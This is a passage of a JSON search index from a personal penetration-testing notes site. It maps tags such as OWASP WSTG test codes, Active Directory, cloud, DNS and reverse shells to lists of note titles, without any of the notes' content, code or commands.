</ul>","tags":["tags"]},{"location":"tags/#wstg-busl-03","title":"WSTG-BUSL-03","text":"<ul> <li>Test Integrity Checks - OWASP Web Security Testing Guide</li> </ul>","tags":["tags"]},{"location":"tags/#wstg-busl-04","title":"WSTG-BUSL-04","text":"<ul> <li>Test for Process Timing - OWASP Web Security Testing Guide</li> </ul>","tags":["tags"]},{"location":"tags/#wstg-busl-05","title":"WSTG-BUSL-05","text":"<ul> <li>Test Number of Times a Function Can Be Used Limits - OWASP Web Security Testing Guide</li> </ul>","tags":["tags"]},{"location":"tags/#wstg-busl-06","title":"WSTG-BUSL-06","text":"<ul> <li>Testing for the Circumvention of Work Flows - OWASP Web Security Testing Guide</li> </ul>","tags":["tags"]},{"location":"tags/#wstg-busl-07","title":"WSTG-BUSL-07","text":"<ul> <li>Test Defenses Against Application Misuse - OWASP Web Security Testing Guide</li> </ul>","tags":["tags"]},{"location":"tags/#wstg-busl-08","title":"WSTG-BUSL-08","text":"<ul> <li>Test Upload of Unexpected File Types - OWASP Web Security Testing Guide</li> </ul>","tags":["tags"]},{"location":"tags/#wstg-busl-09","title":"WSTG-BUSL-09","text":"<ul> <li>Test Upload of Malicious Files - OWASP Web Security Testing Guide</li> </ul>","tags":["tags"]},{"location":"tags/#wstg-busl-10","title":"WSTG-BUSL-10","text":"<ul> <li>Test Payment Functionality - OWASP Web Security Testing Guide</li> </ul>","tags":["tags"]},{"location":"tags/#wstg-clnt-01","title":"WSTG-CLNT-01","text":"<ul> <li>Testing for DOM-Based Cross Site Scripting - OWASP Web Security Testing Guide</li> </ul>","tags":["tags"]},{"location":"tags/#wstg-clnt-02","title":"WSTG-CLNT-02","text":"<ul> <li>Testing for JavaScript Execution - OWASP Web Security Testing Guide</li> </ul>","tags":["tags"]},{"location":"tags/#wstg-clnt-03","title":"WSTG-CLNT-03","text":"<ul> <li>Testing for HTML Injection - OWASP Web Security Testing Guide</li> </ul>","tags":["tags"]},{"location":"tags/#wstg-clnt-04","title":"WSTG-CLNT-04","text":"<ul> <li>Testing for Client-side URL Redirect - OWASP Web Security Testing Guide</li> </ul>","tags":["tags"]},{"location":"tags/#wstg-clnt-05","title":"WSTG-CLNT-05","text":"<ul> <li>Testing for CSS Injection - OWASP Web Security Testing Guide</li> </ul>","tags":["tags"]},{"location":"tags/#wstg-clnt-06","title":"WSTG-CLNT-06","text":"<ul> <li>Testing for Client-side Resource Manipulation - OWASP Web Security Testing Guide</li> </ul>","tags":["tags"]},{"location":"tags/#wstg-clnt-07","title":"WSTG-CLNT-07","text":"<ul> <li>Testing Cross Origin Resource Sharing - OWASP Web Security Testing Guide</li> </ul>","tags":["tags"]},{"location":"tags/#wstg-clnt-08","title":"WSTG-CLNT-08","text":"<ul> <li>Testing for Cross Site Flashing - OWASP Web Security Testing Guide</li> </ul>","tags":["tags"]},{"location":"tags/#wstg-clnt-09","title":"WSTG-CLNT-09","text":"<ul> <li>Testing for Clickjackingx - OWASP Web Security Testing Guide</li> </ul>","tags":["tags"]},{"location":"tags/#wstg-clnt-10","title":"WSTG-CLNT-10","text":"<ul> <li>Testing WebSockets - OWASP Web Security Testing Guide</li> </ul>","tags":["tags"]},{"location":"tags/#wstg-clnt-11","title":"WSTG-CLNT-11","text":"<ul> <li>Testing Web Messaging - OWASP Web Security Testing Guide</li> </ul>","tags":["tags"]},{"location":"tags/#wstg-clnt-12","title":"WSTG-CLNT-12","text":"<ul> <li>Testing Browser Storage - OWASP Web Security Testing Guide</li> </ul>","tags":["tags"]},{"location":"tags/#wstg-clnt-13","title":"WSTG-CLNT-13","text":"<ul> <li>Testing for Cross Site Script Inclusion - OWASP Web Security Testing Guide</li> </ul>","tags":["tags"]},{"location":"tags/#wstg-clnt-14","title":"WSTG-CLNT-14","text":"<ul> <li>Testing for Reverse Tabnabbing - OWASP Web Security Testing Guide</li> </ul>","tags":["tags"]},{"location":"tags/#wstg-conf-01","title":"WSTG-CONF-01","text":"<ul> <li>Test Network Infrastructure Configuration - OWASP Web Security Testing Guide</li> </ul>","tags":["tags"]},{"location":"tags/#wstg-conf-02","title":"WSTG-CONF-02","text":"<ul> <li>Test Application Platform Configuration - OWASP Web Security Testing Guide</li> </ul>","tags":["tags"]},{"location":"tags/#wstg-conf-03","title":"WSTG-CONF-03","text":"<ul> <li>Test File Extensions Handling for Sensitive Information - OWASP Web Security Testing Guide</li> </ul>","tags":["tags"]},{"location":"tags/#wstg-conf-04","title":"WSTG-CONF-04","text":"<ul> <li>Review Old Backup and Unreferenced Files for Sensitive Information - OWASP Web Security Testing Guide</li> </ul>","tags":["tags"]},{"location":"tags/#wstg-conf-05","title":"WSTG-CONF-05","text":"<ul> <li>Enumerate Infrastructure and Application Admin Interfaces - OWASP Web Security Testing Guide</li> </ul>","tags":["tags"]},{"location":"tags/#wstg-conf-06","title":"WSTG-CONF-06","text":"<ul> <li>Test HTTP Methods - OWASP Web Security Testing Guide</li> </ul>","tags":["tags"]},{"location":"tags/#wstg-conf-07","title":"WSTG-CONF-07","text":"<ul> <li>Test HTTP Strict Transport Security - OWASP Web Security Testing Guide</li> </ul>","tags":["tags"]},{"location":"tags/#wstg-conf-08","title":"WSTG-CONF-08","text":"<ul> <li>Test RIA Cross Domain Policy - OWASP Web Security Testing Guide</li> </ul>","tags":["tags"]},{"location":"tags/#wstg-conf-09","title":"WSTG-CONF-09","text":"<ul> <li>Test File Permission - OWASP Web Security Testing Guide</li> </ul>","tags":["tags"]},{"location":"tags/#wstg-conf-10","title":"WSTG-CONF-10","text":"<ul> <li>Test for Subdomain Takeover - OWASP Web Security Testing Guide</li> </ul>","tags":["tags"]},{"location":"tags/#wstg-conf-11","title":"WSTG-CONF-11","text":"<ul> <li>Test Cloud Storage - OWASP Web Security Testing Guide</li> </ul>","tags":["tags"]},{"location":"tags/#wstg-conf-12","title":"WSTG-CONF-12","text":"<ul> <li>Testing for Content Security Policy - OWASP Web Security Testing Guide</li> </ul>","tags":["tags"]},{"location":"tags/#wstg-conf-13","title":"WSTG-CONF-13","text":"<ul> <li>Test Path Confusion - OWASP Web Security Testing Guide</li> </ul>","tags":["tags"]},{"location":"tags/#wstg-cryp-01","title":"WSTG-CRYP-01","text":"<ul> <li>Testing for Weak Transport Layer Security - OWASP Web Security Testing Guide</li> </ul>","tags":["tags"]},{"location":"tags/#wstg-cryp-02","title":"WSTG-CRYP-02","text":"<ul> <li>Testing for Padding Oracle - OWASP Web Security Testing Guide</li> </ul>","tags":["tags"]},{"location":"tags/#wstg-cryp-03","title":"WSTG-CRYP-03","text":"<ul> <li>Testing for Sensitive Information Sent via Unencrypted Channels - OWASP Web Security Testing Guide</li> </ul>","tags":["tags"]},{"location":"tags/#wstg-cryp-04","title":"WSTG-CRYP-04","text":"<ul> <li>Testing for Weak Encryption - OWASP Web Security Testing Guide</li> </ul>","tags":["tags"]},{"location":"tags/#wstg-errh-01","title":"WSTG-ERRH-01","text":"<ul> <li>Testing for Improper Error Handling - OWASP Web Security Testing Guide</li> </ul>","tags":["tags"]},{"location":"tags/#wstg-errh-02","title":"WSTG-ERRH-02","text":"<ul> <li>Testing for Stack Traces - OWASP Web Security Testing Guide</li> </ul>","tags":["tags"]},{"location":"tags/#wstg-idnt-01","title":"WSTG-IDNT-01","text":"<ul> <li>Test Role Definitions - OWASP Web Security Testing Guide</li> </ul>","tags":["tags"]},{"location":"tags/#wstg-idnt-02","title":"WSTG-IDNT-02","text":"<ul> <li>Test User Registration Process - OWASP Web Security Testing Guide</li> </ul>","tags":["tags"]},{"location":"tags/#wstg-idnt-03","title":"WSTG-IDNT-03","text":"<ul> <li>Test Account Provisioning Process - OWASP Web Security Testing Guide</li> </ul>","tags":["tags"]},{"location":"tags/#wstg-idnt-04","title":"WSTG-IDNT-04","text":"<ul> <li>Testing for Account Enumeration and Guessable User Account - OWASP Web Security Testing Guide</li> </ul>","tags":["tags"]},{"location":"tags/#wstg-idnt-05","title":"WSTG-IDNT-05","text":"<ul> <li>Testing for Weak or Unenforced Username Policy - OWASP Web Security Testing Guide</li> </ul>","tags":["tags"]},{"location":"tags/#wstg-info-01","title":"WSTG-INFO-01","text":"<ul> <li>Conduct search engine discovery reconnaissance for information leakage - OWASP Web Security Testing Guide</li> </ul>","tags":["tags"]},{"location":"tags/#wstg-info-02","title":"WSTG-INFO-02","text":"<ul> <li>nikto</li> <li>Fingerprint Web Server - OWASP Web Security Testing Guide</li> </ul>","tags":["tags"]},{"location":"tags/#wstg-info-03","title":"WSTG-INFO-03","text":"<ul> <li>Review Webserver Metafiles for Information Leakage - OWASP Web Security Testing Guide</li> </ul>","tags":["tags"]},{"location":"tags/#wstg-info-04","title":"WSTG-INFO-04","text":"<ul> <li>Enumerate Applications on Webserver - OWASP Web Security Testing Guide</li> </ul>","tags":["tags"]},{"location":"tags/#wstg-info-05","title":"WSTG-INFO-05","text":"<ul> <li>Review Webpage content for Information Leakage - OWASP Web Security Testing Guide</li> </ul>","tags":["tags"]},{"location":"tags/#wstg-info-06","title":"WSTG-INFO-06","text":"<ul> <li>Identify Application Entry Points - OWASP Web Security Testing Guide</li> </ul>","tags":["tags"]},{"location":"tags/#wstg-info-07","title":"WSTG-INFO-07","text":"<ul> <li>Map Execution Paths through applications - OWASP Web Security Testing Guide</li> </ul>","tags":["tags"]},{"location":"tags/#wstg-info-08","title":"WSTG-INFO-08","text":"<ul> <li>Fingerprint Web Application Framework - OWASP Web Security Testing Guide</li> </ul>","tags":["tags"]},{"location":"tags/#wstg-info-09","title":"WSTG-INFO-09","text":"<ul> <li>Fingerprint Web Applications - OWASP Web Security Testing Guide</li> </ul>","tags":["tags"]},{"location":"tags/#wstg-info-10","title":"WSTG-INFO-10","text":"<ul> <li>Map Application architecture - OWASP Web Security Testing Guide</li> </ul>","tags":["tags"]},{"location":"tags/#wstg-inpv-01","title":"WSTG-INPV-01","text":"<ul> <li>Testing for Reflected Cross Site Scripting - OWASP Web Security Testing Guide</li> </ul>","tags":["tags"]},{"location":"tags/#wstg-inpv-02","title":"WSTG-INPV-02","text":"<ul> <li>Testing for Stored Cross Site Scripting - OWASP Web Security Testing Guide</li> </ul>","tags":["tags"]},{"location":"tags/#wstg-inpv-03","title":"WSTG-INPV-03","text":"<ul> <li>Testing for HTTP Verb Tampering - OWASP Web Security Testing Guide</li> </ul>","tags":["tags"]},{"location":"tags/#wstg-inpv-04","title":"WSTG-INPV-04","text":"<ul> <li>Testing for HTTP Parameter Pollution - OWASP Web Security Testing Guide</li> </ul>","tags":["tags"]},{"location":"tags/#wstg-inpv-05","title":"WSTG-INPV-05","text":"<ul> <li>Testing for SQL Injection - OWASP Web Security Testing Guide</li> </ul>","tags":["tags"]},{"location":"tags/#wstg-inpv-06","title":"WSTG-INPV-06","text":"<ul> <li>Testing for LDAP Injection - OWASP Web Security Testing Guide</li> </ul>","tags":["tags"]},{"location":"tags/#wstg-inpv-07","title":"WSTG-INPV-07","text":"<ul> <li>Testing for XML Injection - OWASP Web Security Testing Guide</li> </ul>","tags":["tags"]},{"location":"tags/#wstg-inpv-08","title":"WSTG-INPV-08","text":"<ul> <li>Testing for SSI Injection - OWASP Web Security Testing Guide</li> </ul>","tags":["tags"]},{"location":"tags/#wstg-inpv-09","title":"WSTG-INPV-09","text":"<ul> <li>Testing for XPath Injection - OWASP Web Security Testing Guide</li> </ul>","tags":["tags"]},{"location":"tags/#wstg-inpv-10","title":"WSTG-INPV-10","text":"<ul> <li>Testing for IMAP SMTP Injection - OWASP Web Security Testing Guide</li> </ul>","tags":["tags"]},{"location":"tags/#wstg-inpv-11","title":"WSTG-INPV-11","text":"<ul> <li>Testing for Code Injection - OWASP Web Security Testing Guide</li> </ul>","tags":["tags"]},{"location":"tags/#wstg-inpv-12","title":"WSTG-INPV-12","text":"<ul> <li>Testing for Command Injection - OWASP Web Security Testing Guide</li> </ul>","tags":["tags"]},{"location":"tags/#wstg-inpv-13","title":"WSTG-INPV-13","text":"<ul> <li>Testing for Format String Injection - OWASP Web Security Testing Guide</li> </ul>","tags":["tags"]},{"location":"tags/#wstg-inpv-14","title":"WSTG-INPV-14","text":"<ul> <li>Testing for Incubated Vulnerability - OWASP Web Security Testing Guide</li> </ul>","tags":["tags"]},{"location":"tags/#wstg-inpv-15","title":"WSTG-INPV-15","text":"<ul> <li>Testing for HTTP Splitting Smuggling - OWASP Web Security Testing Guide</li> </ul>","tags":["tags"]},{"location":"tags/#wstg-inpv-16","title":"WSTG-INPV-16","text":"<ul> <li>Testing for HTTP Incoming Requests - OWASP Web Security Testing Guide</li> </ul>","tags":["tags"]},{"location":"tags/#wstg-inpv-17","title":"WSTG-INPV-17","text":"<ul> <li>Testing for Host Header Injection - OWASP Web Security Testing Guide</li> </ul>","tags":["tags"]},{"location":"tags/#wstg-inpv-18","title":"WSTG-INPV-18","text":"<ul> <li>Testing for Server-side Template Injection - OWASP Web Security Testing Guide</li> </ul>","tags":["tags"]},{"location":"tags/#wstg-inpv-19","title":"WSTG-INPV-19","text":"<ul> <li>Testing for Server-Side Request Forgery - OWASP Web Security Testing Guide</li> </ul>","tags":["tags"]},{"location":"tags/#wstg-inpv-20","title":"WSTG-INPV-20","text":"<ul> <li>Testing for Mass Assignment - OWASP Web Security Testing Guide</li> </ul>","tags":["tags"]},{"location":"tags/#wstg-sess-01","title":"WSTG-SESS-01","text":"<ul> <li>Testing for Session Management Schema - OWASP Web Security Testing Guide</li> </ul>","tags":["tags"]},{"location":"tags/#wstg-sess-02","title":"WSTG-SESS-02","text":"<ul> <li>Testing for Cookies Attributes - OWASP Web Security Testing Guide</li> </ul>","tags":["tags"]},{"location":"tags/#wstg-sess-03","title":"WSTG-SESS-03","text":"<ul> <li>Testing for Session Fixation - OWASP Web Security Testing Guide</li> </ul>","tags":["tags"]},{"location":"tags/#wstg-sess-04","title":"WSTG-SESS-04","text":"<ul> <li>Testing for Exposed Session Variables - OWASP Web Security Testing Guide</li> </ul>","tags":["tags"]},{"location":"tags/#wstg-sess-05","title":"WSTG-SESS-05","text":"<ul> <li>Testing for Cross Site Request Forgery - OWASP Web Security Testing Guide</li> </ul>","tags":["tags"]},{"location":"tags/#wstg-sess-06","title":"WSTG-SESS-06","text":"<ul> <li>Testing for Logout Functionality - OWASP Web Security Testing Guide</li> </ul>","tags":["tags"]},{"location":"tags/#wstg-sess-07","title":"WSTG-SESS-07","text":"<ul> <li>Testing Session Timeout - OWASP Web Security Testing Guide</li> </ul>","tags":["tags"]},{"location":"tags/#wstg-sess-08","title":"WSTG-SESS-08","text":"<ul> <li>Testing for Session Puzzling - OWASP Web Security Testing Guide</li> </ul>","tags":["tags"]},{"location":"tags/#wstg-sess-09","title":"WSTG-SESS-09","text":"<ul> <li>Testing for Session Hijacking - OWASP Web Security Testing Guide</li> </ul>","tags":["tags"]},{"location":"tags/#wstg-sess-10","title":"WSTG-SESS-10","text":"<ul> <li>Testing JSON Web Tokens - OWASP Web Security Testing Guide</li> </ul>","tags":["tags"]},{"location":"tags/#active","title":"active","text":"<ul> <li>Port 389 - 636 LDAP</li> <li>Access Control List -ACL</li> <li>Attacking Active Directory from Linux</li> <li>Enumerating Active Directory from Linux</li> <li>Lateral Movement in Active Directory from Linux</li> <li>Attacking Active Directory from Linux</li> <li>Attacking Active Directory from Windows</li> <li>Enumerating Active Directory from Windows</li> <li>Interesting Windows Computer &amp; Active Directory Well-Known Security Identifiers - SIDs</li> <li>DomainPasswordSpray</li> <li>Inveigh</li> <li>Kerberos Authentication</li> <li>LDAP - Active Directory</li> <li>PowerUpSQL</li> </ul>","tags":["tags"]},{"location":"tags/#active-directory","title":"active directory","text":"<ul> <li>Privilege escalation in Active Directory from Windows</li> <li>Active Directory</li> <li>The ActiveDirectory PowerShell module</li> <li>BloodHound</li> <li>evil-winrm</li> <li>Kerbrute</li> <li>Microsoft Management Console (MMC)</li> <li>NT Authority System</li> <li>PowerUp.ps1</li> <li>Powerview.ps1</li> <li>Responder.py - A SMB server to listen to NTLM hashes</li> <li>SharpView</li> </ul>","tags":["tags"]},{"location":"tags/#active-recon","title":"active recon","text":"<ul> <li>nmap - A network exploration and security auditing tool</li> <li>Powercat - An alternative to netcat coded in PowerShell</li> </ul>","tags":["tags"]},{"location":"tags/#aes","title":"aes","text":"<ul> <li>TCP reverse shell with AES encryption</li> <li>TCP reverse shell with hybrid encryption AES + RSA</li> </ul>","tags":["tags"]},{"location":"tags/#amazon","title":"amazon","text":"<ul> <li>AWS cli</li> </ul>","tags":["tags"]},{"location":"tags/#amazon-web-services","title":"amazon web services","text":"<ul> <li>Amazon Web Services (AWS) Essentials</li> </ul>","tags":["tags"]},{"location":"tags/#android","title":"android","text":"<ul> <li>scrcpy</li> </ul>","tags":["tags"]},{"location":"tags/#apache-cloudstack","title":"apache cloudstack","text":"<ul> <li>Apache CloudStack Essentials</li> </ul>","tags":["tags"]},{"location":"tags/#api","title":"api","text":"<ul> <li>arjun</li> <li>Pentesting GraphQL</li> <li>Hacking APIs</li> <li>API authentication attacks</li> <li>Api Reconnaissance</li> <li>Endpoint analysis</li> <li>Evasion and combinig techniques</li> <li>Exploiting API Authorization</li> <li>Testing for improper assets management</li> <li>Injection attacks</li> <li>Mass assignment</li> <li>Setting up the labs + Writeups</li> <li>Scanning APIs</li> <li>SSRF attack - Server-side Request Forgery</li> <li>Setting up the environment</li> </ul>","tags":["tags"]},{"location":"tags/#arp","title":"arp","text":"<ul> <li>Arp poisoning</li> </ul>","tags":["tags"]},{"location":"tags/#arp-poisoning","title":"arp poisoning","text":"<ul> <li>Arp poisoning</li> </ul>","tags":["tags"]},{"location":"tags/#assessment","title":"assessment","text":"<ul> <li>Vulnerability assessment</li> </ul>","tags":["tags"]},{"location":"tags/#attack","title":"attack","text":"<ul> <li>Broken access control</li> <li>Buffer Overflow attack</li> <li>Captcha Replay attack</li> <li>Carriage Return and Linefeed - CRLF Attack</li> <li>XFS attack - Cross-frame Scripting</li> <li>CSRF attack - Cross Site Request Forgery</li> <li>XSS attack - Cross-Site Scripting</li> <li>Insecure deserialization</li> </ul>","tags":["tags"]},{"location":"tags/#authentication","title":"authentication","text":"<ul> <li>Kerberos Authentication</li> <li>HTTP Authentication Schemes</li> </ul>","tags":["tags"]},{"location":"tags/#aws","title":"aws","text":"<ul> <li>AWS cli</li> <li>Amazon Web Services (AWS) Essentials</li> </ul>","tags":["tags"]},{"location":"tags/#az-104","title":"az-104","text":"<ul> <li>AZ-104 Microsoft Azure Administrator certificate</li> </ul>","tags":["tags"]},{"location":"tags/#az-500","title":"az-500","text":"<ul> <li>AZ-500 Microsoft Azure Active Directory-  Manage Identity and Access</li> <li>AZ-500 Microsoft Azure Active Directory-  Platform protection</li> <li>AZ-500 Microsoft Azure Active Directory- Data and applications</li> <li>AZ-500 Microsoft Azure Active Directory- Security operations</li> <li>Exams - Practice the AZ-500</li> <li>AZ-500 Microsoft Azure Security Technologies Certificate - keep learning</li> <li>AZ-500 Microsoft Azure Security Technologies Certificate</li> </ul>","tags":["tags"]},{"location":"tags/#az-900","title":"az-900","text":"<ul> <li>Exams - Practice the AZ-900</li> <li>AZ-900 Notes to get through the Azure Fundamentals Certificate</li> </ul>","tags":["tags"]},{"location":"tags/#azure_1","title":"azure","text":"<ul> <li>Azure-CLI</li> <li>Azure Powershell</li> <li>AZ-104 Microsoft Azure Administrator certificate</li> <li>AZ-500 Microsoft Azure Active Directory-  Manage Identity and Access</li> <li>AZ-500 Microsoft Azure Active Directory-  Platform protection</li> <li>AZ-500 Microsoft Azure Active Directory- Data and applications</li> <li>AZ-500 Microsoft Azure Active Directory- Security operations</li> <li>Exams - Practice the AZ-500</li> <li>AZ-500 Microsoft Azure Security Technologies Certificate - keep learning</li> <li>AZ-500 Microsoft Azure Security Technologies Certificate</li> <li>Exams - Practice the AZ-900</li> <li>AZ-900 Notes to get through the Azure Fundamentals Certificate</li> </ul>","tags":["tags"]},{"location":"tags/#azure-cli","title":"azure-cli","text":"<ul> <li>Azure-CLI</li> </ul>","tags":["tags"]},{"location":"tags/#backdoors","title":"backdoors","text":"<ul> <li>Evading detection in file transfers</li> <li>Transferring files with code</li> <li>Transferring files techniques - Linux</li> <li>Transferring files techniques - Windows</li> </ul>","tags":["tags"]},{"location":"tags/#bash","title":"bash","text":"<ul> <li>Packet manager</li> <li>Azure-CLI</li> <li>bash - Bourne Again Shell</li> <li>curl</li> <li>unshadow</li> <li>vnstat - Monitoring network impact</li> </ul>","tags":["tags"]},{"location":"tags/#basic-digest","title":"basic digest","text":"<ul> <li>HTTP Authentication Schemes</li> </ul>","tags":["tags"]},{"location":"tags/#bcm","title":"bcm","text":"<ul> <li>623 - Intelligent Platform Management Interface (IPMI)</li> </ul>","tags":["tags"]},{"location":"tags/#binaries","title":"binaries","text":"<ul> <li>LOLbins - Living off the land binaries - LOLbas and GTFObins</li> </ul>","tags":["tags"]},{"location":"tags/#bind-shells","title":"bind shells","text":"<ul> <li>Bind Shells</li> </ul>","tags":["tags"]},{"location":"tags/#binscope","title":"binscope","text":"<ul> <li>Common vulnerabilities</li> </ul>","tags":["tags"]},{"location":"tags/#browsers","title":"browsers","text":"<ul> <li>Pentesting browsers</li> <li>Man in the browser attack</li> </ul>","tags":["tags"]},{"location":"tags/#brute","title":"brute","text":"<ul> <li>Crowbar</li> </ul>","tags":["tags"]},{"location":"tags/#brute-force","title":"brute force","text":"<ul> <li>John the Ripper - A hash cracker and dictionary attack tool</li> </ul>","tags":["tags"]},{"location":"tags/#brute-forcing","title":"brute forcing","text":"<ul> <li>hydra</li> <li>medusa</li> </ul>","tags":["tags"]},{"location":"tags/#burpsuite","title":"burpsuite","text":"<ul> <li>Burpsuite</li> <li>Interactsh - An alternative to BurpSuite Collaborator</li> <li>BurpSuite Labs - Broken access control vulnerabilities</li> <li>BurpSuite Labs - Insecure deserialization</li> <li>BurpSuite Labs - Json Web Token jwt</li> <li>BurpSuite Labs</li> <li>BurpSuite Labs - SQL injection</li> <li>BurpSuite Labs - Server Side Request Forgery</li> <li>BurpSuite Labs - Server Side Template Injection</li> <li>BurpSuite Labs - Cross-site Scripting</li> <li>BurpSuite Labs - Json Web Token jwt</li> <li>Traffic analysis - Thick client Applications</li> </ul>","tags":["tags"]},{"location":"tags/#bypass-techniques","title":"bypass techniques","text":"<ul> <li>Virtualbox and Extension Pack</li> </ul>","tags":["tags"]},{"location":"tags/#bypassing-firewall","title":"bypassing firewall","text":"<ul> <li>Bypassing Next Generation Firewalls</li> </ul>","tags":["tags"]},{"location":"tags/#bypassing-techniques","title":"bypassing techniques","text":"<ul> <li>Bypassing Next Generation Firewalls</li> <li>Hickjack the Internet Explorer process to bypass an host-based firewall</li> </ul>","tags":["tags"]},{"location":"tags/#certification","title":"certification","text":"<ul> <li>CPTS Cheat sheet</li> <li>CPTS labs</li> <li>eWPT Preparation</li> <li>AZ-104 Microsoft Azure Administrator certificate</li> <li>AZ-500 Microsoft Azure Active Directory-  Manage Identity and Access</li> <li>AZ-500 Microsoft Azure Active Directory-  Platform protection</li> <li>AZ-500 Microsoft Azure Active Directory- Data and applications</li> <li>AZ-500 Microsoft Azure Active Directory- Security operations</li> <li>Exams - Practice the AZ-500</li> <li>AZ-500 Microsoft Azure Security Technologies Certificate - keep learning</li> <li>AZ-500 Microsoft Azure Security Technologies Certificate</li> <li>Exams - Practice the AZ-900</li> <li>AZ-900 Notes to get through the Azure Fundamentals Certificate</li> </ul>","tags":["tags"]},{"location":"tags/#cheat","title":"cheat","text":"<ul> <li>Pentesting Powerapp</li> </ul>","tags":["tags"]},{"location":"tags/#cheat-sheet","title":"cheat sheet","text":"<ul> <li>CPTS Cheat sheet</li> <li>msSQL - Microsoft SQL Server</li> <li>Responder.py - A SMB server to listen to NTLM hashes</li> <li>sqsh</li> </ul>","tags":["tags"]},{"location":"tags/#checklist","title":"checklist","text":"<ul> <li>Thick client Applications Pentesting Checklist</li> </ul>","tags":["tags"]},{"location":"tags/#checksum","title":"checksum","text":"<ul> <li>Checksum</li> </ul>","tags":["tags"]},{"location":"tags/#chrome","title":"chrome","text":"<ul> <li>Pentesting browsers</li> </ul>","tags":["tags"]},{"location":"tags/#cloud","title":"cloud","text":"<ul> <li>AWS cli</li> <li>Azure-CLI</li> <li>Azure Powershell</li> <li>gcloud CLI</li> <li>Apache CloudStack Essentials</li> <li>Amazon Web Services (AWS) Essentials</li> <li>Pentesting Amazon Web Services (AWS)</li> <li>AZ-104 Microsoft Azure Administrator certificate</li> <li>AZ-500 Microsoft Azure Active Directory-  Manage Identity and Access</li> <li>AZ-500 Microsoft Azure Active Directory-  Platform protection</li> <li>AZ-500 Microsoft Azure Active Directory- Data and applications</li> <li>AZ-500 Microsoft Azure Active Directory- Security operations</li> <li>Exams - Practice the AZ-500</li> <li>AZ-500 Microsoft Azure Security Technologies Certificate - keep learning</li> <li>AZ-500 Microsoft Azure Security Technologies Certificate</li> <li>Exams - Practice the AZ-900</li> <li>AZ-900 Notes to get through the Azure Fundamentals Certificate</li> <li>Pentesting Azure</li> <li>Pentesting docker</li> <li>Google Cloud Platform Essentials</li> <li>Openstack Essentials</li> </ul>","tags":["tags"]},{"location":"tags/#cloud-pentesting","title":"cloud pentesting","text":"<ul> <li>Pentesting cloud</li> </ul>","tags":["tags"]},{"location":"tags/#cms_1","title":"cms","text":"<ul> <li>moodlescan</li> </ul>","tags":["tags"]},{"location":"tags/#connection","title":"connection","text":"<ul> <li>How to resolve run of the mill...</li> </ul>","tags":["tags"]},{"location":"tags/#containers","title":"containers","text":"<ul> <li>Pentesting docker</li> </ul>","tags":["tags"]},{"location":"tags/#course","title":"course","text":"<ul> <li>eWPT Preparation</li> <li>AZ-104 Microsoft Azure Administrator certificate</li> <li>AZ-500 Microsoft Azure Active Directory-  Manage Identity and Access</li> <li>AZ-500 Microsoft Azure Active Directory-  Platform protection</li> <li>AZ-500 Microsoft Azure Active Directory- Data and applications</li> <li>AZ-500 Microsoft Azure Active Directory- Security operations</li> <li>AZ-500 Microsoft Azure Security Technologies Certificate - keep learning</li> <li>AZ-500 Microsoft Azure Security Technologies Certificate</li> <li>AZ-900 Notes to get through the Azure Fundamentals Certificate</li> </ul>","tags":["tags"]},{"location":"tags/#cracking-tool","title":"cracking tool","text":"<ul> <li>Hashcat - A password recovery tool</li> </ul>","tags":["tags"]},{"location":"tags/#crawler","title":"crawler","text":"<ul> <li>Crawlers</li> </ul>","tags":["tags"]},{"location":"tags/#crytography","title":"crytography","text":"<ul> <li>cryptography</li> </ul>","tags":["tags"]},{"location":"tags/#cvss","title":"cvss","text":"<ul> <li>CVSS Common Vulnerability Scoring System</li> <li>Microsoft DREAD</li> </ul>","tags":["tags"]},{"location":"tags/#cybersecurity","title":"cybersecurity","text":"<ul> <li>Welcome to Hacking Life!</li> </ul>","tags":["tags"]},{"location":"tags/#database","title":"database","text":"<ul> <li>MariaDB</li> <li>Mongo</li> <li>Mongo</li> <li>msSQL - Microsoft SQL Server</li> <li>MySQL</li> <li>Pentesting Powerapp</li> <li>sqlite</li> <li>sqlite</li> <li>sqsh</li> <li>Virtual environments</li> <li>Virtual environments</li> </ul>","tags":["tags"]},{"location":"tags/#ddns","title":"ddns","text":"<ul> <li>Coding a DDNS aware shell</li> </ul>","tags":["tags"]},{"location":"tags/#deserialization","title":"deserialization","text":"<ul> <li>Phpggc - A tool for PHP deserialization</li> <li>Ysoserial - A tool for Java deserialization</li> <li>BurpSuite Labs - Insecure deserialization</li> </ul>","tags":["tags"]},{"location":"tags/#dictionaries","title":"dictionaries","text":"<ul> <li>cewl - A custom dictionary generator</li> <li>crunch - A dictionary generator</li> </ul>","tags":["tags"]},{"location":"tags/#dictionary","title":"dictionary","text":"<ul> <li>CUPP - Common User Password Profiler</li> <li>Dictionaries or wordlists resources</li> <li>Creating malware and custom payloads</li> </ul>","tags":["tags"]},{"location":"tags/#dictionary-attack","title":"dictionary attack","text":"<ul> <li>John the Ripper - A hash cracker and dictionary attack tool</li> </ul>","tags":["tags"]},{"location":"tags/#dictionary-generator","title":"dictionary generator","text":"<ul> <li>CUPP - Common User Password Profiler</li> </ul>","tags":["tags"]},{"location":"tags/#directory","title":"directory","text":"<ul> <li>Port 389 - 636 LDAP</li> <li>Access Control List -ACL</li> <li>Attacking Active Directory from Linux</li> <li>Enumerating Active Directory from Linux</li> <li>Lateral Movement in Active Directory from Linux</li> <li>Attacking Active Directory from Linux</li> <li>Attacking Active Directory from Windows</li> <li>Enumerating Active Directory from Windows</li> <li>Interesting Windows Computer &amp; Active Directory Well-Known Security Identifiers - SIDs</li> <li>DomainPasswordSpray</li> <li>Inveigh</li> <li>Kerberos Authentication</li> <li>LDAP - Active Directory</li> <li>PowerUpSQL</li> </ul>","tags":["tags"]},{"location":"tags/#directory-enumeration","title":"directory enumeration","text":"<ul> <li>dirb - A web content enumeration tool</li> </ul>","tags":["tags"]},{"location":"tags/#django","title":"django","text":"<ul> <li>django pentesting</li> </ul>","tags":["tags"]},{"location":"tags/#dll-hickjacking","title":"dll hickjacking","text":"<ul> <li>Attacking thick clients applications - Data storage issues</li> </ul>","tags":["tags"]},{"location":"tags/#dns","title":"dns","text":"<ul> <li>dig axfr</li> <li>dnsenum - A tool to enumerate DNS</li> <li>DNSRecon - DNS Enumeration and Scanning Tool</li> <li>fierce - DNS scanner that helps locate non-contiguous IP space and hostnames</li> <li>How to resolve run of the mill...</li> <li>nslookup</li> <li>SubBrute</li> <li>subfinder</li> </ul>","tags":["tags"]},{"location":"tags/#dns-enumeration","title":"dns enumeration","text":"<ul> <li>Amass</li> </ul>","tags":["tags"]},{"location":"tags/#dnspy","title":"dnspy","text":"<ul> <li>Attacking thick clients applications - Data storage issues</li> <li>First challenge - Enabling a button - Thick client Applications</li> 